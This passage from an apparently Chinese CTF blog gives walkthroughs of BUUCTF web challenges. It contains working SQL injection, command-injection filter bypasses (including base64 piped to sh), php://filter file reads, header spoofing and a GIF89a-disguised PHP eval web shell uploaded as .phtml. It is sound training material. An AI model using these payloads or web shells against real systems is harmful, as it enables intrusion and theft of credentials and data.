<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br><span class="line">实际执行的语句为:</span><br><span class="line">select 1;</span><br><span class="line">set sql_mode=PIPES_AS_CONCAT;</span><br><span class="line">select 1||flag from Flag;</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><img src="/images/buuctf-web/image-20221013203635206.png" alt="image-20221013203635206" style="zoom:67%;" />

<p>打开网页只有这么几个字符,可能是提示在url里带上参数<code>ip</code></p>
<img src="/images/buuctf-web/image-20221013203740321-166704781973310.png" alt="image-20221013203740321" style="zoom:67%;" />

<p>那么就用命令注入的思路先尝试一下执行多条命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221013203834440-166704781973311.png" alt="image-20221013203834440" style="zoom:67%;" />

<p>下面尝试用<code>cat flag.php</code>来读取:</p>
<img src="/images/buuctf-web/image-20221013203934482-166704781973412.png" alt="image-20221013203934482" style="zoom:67%;" />

<p>空格应该是被过滤了…</p>
<p>那么尝试一些<strong>空格的代替选项:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS、$&#123;IFS&#125;、$IFS$9、%09（在URL上使用较多）、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20(space)、%09(tab)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFSflag.php</span><br></pre></td></tr></table></figure>

<p>结果..</p>
<img src="/images/buuctf-web/image-20221013204255136-166704781973413.png" alt="image-20221013204255136" style="zoom:67%;" />

<p>无奈,看一下另一个文件<code>index.php</code>吧,结果输出了源码,这里可以看到具体过滤了哪些字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就要考虑绕过方法了</p>
<ul>
<li><strong>payload1: 通过<code>base64</code>编码执行命令:</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFSY2F0IGZsYWcucGhwCg==|base64$IFS-d|sh</span><br><span class="line">这里实际上执行的命令是:</span><br><span class="line">IFSY2F0IGZsYWcucGhwCg== 是base64编码后的cat flag.php</span><br><span class="line">echo IFSY2F0IGZsYWcucGhwCg== 输出结果作为 base -d的输入,进行解码</span><br><span class="line">然后将上面解码的结果再作为sh的输入,也就是作为命令执行cat flag.php</span><br></pre></td></tr></table></figure>



<ul>
<li><strong>payload2:内联执行命令:</strong></li>
</ul>
<blockquote>
<p><strong>反引号再linux中能够使前面的命令执行它内部命令的输出结果,即:</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cat</span> `<span class="built_in">ls</span>`</span></span><br></pre></td></tr></table></figure>

<p>若<code>ls</code>的执行结果为111.txt,则上面的命令相当于执行<code>cat 111.txt</code></p>
</blockquote>
<p>所以,payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS`ls`</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>payload3:变量拼接绕过</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</span><br><span class="line">给变量a赋值&#x27;g&#x27;,然后拼接到最终执行的命令里来绕过过滤.</span><br></pre></td></tr></table></figure>

<p>flag在源码里:</p>
<img src="/images/buuctf-web/image-20221013204757970-166704781973414.png" alt="image-20221013204757970" style="zoom:67%;" />





<br>

<hr>
<br>

<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>进去先看源码,发现一个链接:<code>Archive_room.php</code>,进去继续看源码,发现<code>action.php</code></p>
<p>继续点进去,结果直接跳过<code>action.php</code>到了<code>end.php</code></p>
<p>这里抓下包看看<code>action.php</code>的响应包:</p>
<img src="/images/buuctf-web/image-20221013210413117-166704781973415.png" alt="image-20221013210413117" style="zoom:67%;" />

<p>访问这个<code>secr3t.php</code>看到源码: 文件包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>那么先尝试包含<code>flag.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=flag.php</span><br></pre></td></tr></table></figure>

<p>并不在这里</p>
<img src="/images/buuctf-web/image-20221013211456760.png" alt="image-20221013211456760" style="zoom:67%;" />

<p>使用php伪协议读取<code>flag.php</code>的源码,得到flag</p>
<p>校园网就爆502,热点就可以,这是啥问题……..</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014161343528-166704781973416.png" alt="image-20221014161343528" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>进来先试试万能密码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014181006054-166704781973417.png" alt="image-20221014181006054" style="zoom:67%;" />

<p>成功登录了,不过这些信息也没什么用</p>
<p>接下来用<code>union</code>查询来爆一下数据库信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">31cae64d3b82c584b7611bf737473952&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014152047891-166704781973418.png" alt="image-20221014152047891" style="zoom:67%;" />

<p>出错了,需要添加占位列,不确定位置的话就都尝试一下好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,version(),database()#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014152122462-166704781973419.png" alt="image-20221014152122462" style="zoom:67%;" />

<p>成功,说明有结果有三列,后两列会回显.</p>
<p>那么后面就简单了,接下来爆表名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(TABLE_NAME) from information_schema.tables where table_schema=database() limit 0,1#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014180215987-166704781973420.png" alt="image-20221014180215987" style="zoom:67%;" />

<p>发现有两个表,名字分别为:<code>geekuser</code>和<code>l0ve1ysq1</code> 显然第二个比较可疑,爆一下列名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(COLUMN_NAME) from information_schema.columns where table_schema=database() and table_name=&#x27;l0ve1ysq1&#x27; limit 0,1#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014180511642-166704781973421.png" alt="image-20221014180511642" style="zoom:67%;" />



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 limit 0,1#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014180852303-166704781973422.png" alt="image-20221014180852303" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221014180904238-166704781973423.png" alt="image-20221014180904238" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>真就白给shell,根据提示直接POST给<code>Syn</code>这个变量传值执行命令就行了</p>
<p>扫描一下当前目录并输出,看到一个<code>index.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Syc=print_r(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014183934877-166704781973424.png" alt="image-20221014183934877" style="zoom:67%;" />

<p>输出一下<code>index.php</code>的源码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Syc=show_source(&quot;index.php&quot;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014184051797-166704781973425.png" alt="image-20221014184051797" style="zoom:67%;" />

<p>扫一下根目录,发现有个名为flag的文件,通过系统命令输出其内容就看到了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Syc=print_r(scandir(&quot;/&quot;));</span><br><span class="line">Syc=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014184350220-166704781973426.png" alt="image-20221014184350220" style="zoom:67%;" />



<p>这题也可以拿菜刀之类的软件连一下<code>Syn</code>这个变量,找得会更快.</p>
<br>

<hr>
<br>

<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>在源码里能找到<code>Secret.php</code>,访问之:</p>
<img src="/images/buuctf-web/image-20221014185328220-166704781973427.png" alt="image-20221014185328220" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br></pre></td></tr></table></figure>

<p>这里根据提示,可以在请求中添加<code>Referer</code>头字段,这个字段用于告知服务器用户是从哪个字段来的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></figure>

<p>发送请求后又提示,请使用<code>Syclover</code>浏览器,那么修改<code>User-Agent</code>字段就行:</p>
<img src="/images/buuctf-web/image-20221014190838466-166704781973428.png" alt="image-20221014190838466" style="zoom:67%;" />

<p>直接在划线处用<code>Syclover</code>替换了<code>Firefox</code></p>
<p>发送请求后提示:「No!!! you can only read this locally!!!」</p>
<p>那么需要添加<code>X-Forwarded-For(XFF)</code>头: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014191033879.png" alt="image-20221014191033879" style="zoom:80%;" />

<p>拿到flag</p>
<img src="/images/buuctf-web/image-20221014190605829-166704781973429.png" alt="image-20221014190605829" style="zoom:67%;" />



<br>

<hr>
<br>



<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>提示要求上传图片,那么如果要传一句话木马的话肯定得绕过图片检测</p>
<p>简单改文件扩展名不管用,应该是使用了<code>getimagesize</code>这样的函数对文件内容进行了检测</p>
<img src="/images/buuctf-web/image-20221014210751046-166704781973431.png" alt="image-20221014210751046" style="zoom:67%;" />

<p>另外,文件内容中包含<code>?&gt;</code>这样的符号也会被检测出来</p>
<img src="/images/buuctf-web/image-20221014211253339-166704781973430.png" alt="image-20221014211253339" style="zoom:67%;" />

<p>因此在编写一句话木马时也需要做一些绕过措施</p>
<blockquote>
<p>补充知识点: <strong>GIF89a头文件欺骗</strong></p>
<p>假如某个文件的内容为:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;GIF89a</span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>后台在读取文件内容时会认为此文件为图片,这样能够骗过<code>getimagesize</code>的检测</strong></p>
</blockquote>
<p>如此以来,搞定了文件内容,就可以看一看哪些文件扩展名能够上传成功了</p>
<p>尝试一下<code>phtml</code>,<code>pht</code>,<code>php3</code>,<code>php4</code>,<code>php5</code>等,这些扩展名都能够被服务器当作<code>php</code>来执行</p>
<img src="/images/buuctf-web/image-20221014210547256-166704781973432.png" alt="image-20221014210547256" style="zoom:67%;" />

<p>另外,直接文件扩展名改为<code>gif</code>也能够上传成功</p>
<p>用菜刀尝试连一下<code>http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/112.phtml</code>报404,说明上传文件不存放在这个目录, 尝试一下<code>http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/upload</code>这个目录,竟然猜中了:</p>
<img src="/images/buuctf-web/image-20221014212101985-166704781973433.png" alt="image-20221014212101985" style="zoom:67%;" />



<p>这样用菜刀连上就好了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d6e4d513-4501-430a-8cff-023311e288e1.node4.buuoj.cn:81/upload/112.phtml</span><br></pre></td></tr></table></figure>

<p>在根目录里找到了flag</p>
<p>另外还找到了检测上传文件脚本的源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;phtm&quot;</span>); <span class="comment">//过滤php文件,这里漏了phtml</span></span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>));        <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="variable">$image_type</span> = @<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]); <span class="comment">//获取图片exif信息,也就根据内容检测了文件是否为图片</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/x-png&quot;</span>)</span><br><span class="line">|| (<span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) <span class="comment">//允许的文件格式</span></span><br><span class="line">&amp;&amp;<span class="variable">$file</span>[<span class="string">&quot;size&quot;</span>] &lt; <span class="number">20480</span>)    <span class="comment">// 小于 20 kb //限制上传文件的大小</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NOT！&quot;</span>.<span class="variable">$extension</span>.<span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">elseif</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO! HACKER! your file included &#x27;&amp;#x3C;&amp;#x3F;&#x27;&quot;</span>;</span><br><span class="line">    &#125; <span class="comment">//检测文件内容中是否有非法字符</span></span><br><span class="line">    <span class="keyword">elseif</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t lie to me, it&#x27;s not image at all!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$fileName</span>=<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$fileName</span>); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Not image!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>还是上传文件,要求只上传jpg,png,gif格式的</p>
<p>如果上传了其他格式的,直接就会在前端弹窗,弹窗时都没有抓到包,这里的检测应该发生在前端</p>
<img src="/images/buuctf-web/image-20221014215427308-166704781973435.png" alt="image-20221014215427308" style="zoom: 67%;" />

<img src="/images/buuctf-web/image-20221014214036126.png" alt="image-20221014214036126" style="zoom:67%;" />

<p>那么可以先上传后缀名符合要求的<code>jpg,png,gif</code>图片,然后修改包中的文件后缀名为<code>phtml</code>(经过尝试,<code>php</code>会被后端过滤出来,尝试了一圈还是只能用<code>phtml</code>)</p>
<img src="/images/buuctf-web/image-20221014214913199-166704781973434.png" alt="image-20221014214913199" style="zoom:67%;" />

<p>上传成功,这里还很贴心地给了路径,那么使用菜刀连接就能找到flag了.</p>
<img src="/images/buuctf-web/image-20221014214944504-166704781973436.png" alt="image-20221014214944504" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221014215043655-166704781973437.png" alt="image-20221014215043655" style="zoom:67%;" />



<br>

<hr>
<br>



<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>万能密码不能用了</p>
<p><img src="/image/buuctf-web/image-20221014222541901.png" alt="image-20221014222541901"><img src="/images/buuctf-web/image-20221014222541901.png" alt="image-20221014222541901" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014222258099-166704781973438.png" alt="image-20221014222258099" style="zoom:67%;" /></p>
<p>但是密码框直接输入<code>1&#39;</code>会报错,说明还是存在注入漏洞</p>
<img src="/images/buuctf-web/image-20221014222358093-166704781973439.png" alt="image-20221014222358093" style="zoom:67%;" />

<p>尝试<code>union select</code>,依然报错,根据前面输入<code>1&#39;</code>和<code>1&#39; or &#39;1&#39;=&#39;1&#39;#</code>的对比,这里应该是存在关键词过滤</p>
<p>这里对<code>or</code>尝试一下双写绕过: 成功,果然如此</p>
<p><img src="/images/buuctf-web/image-20221014222633460-166704781973440.png" alt="image-20221014222633460" style="zoom:67%;" /><img src="/images/buuctf-web/image-20221014222649635.png" alt="image-20221014222649635" style="zoom:67%;" /></p>
<p>那么对<code>union</code>和<code>select</code>使用同样的方法来绕过:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom information_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014221556384.png" alt="image-20221014221556384" style="zoom:67%;" />

<p>这里<code>imformation</code>中的<code>or</code>也被过滤了…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014221726604-166704781973442.png" alt="image-20221014221726604" style="zoom:67%;" />

<p>后面用常规方法一步一步找到flag就好了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(COLUMN_NAME) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014221925750-166704781973443.png" alt="image-20221014221925750" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221014222131054-166704781973444.png" alt="image-20221014222131054" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>进去啥都找不到,先拿<code>dirsearch</code>工具扫一下网站目录:</p>
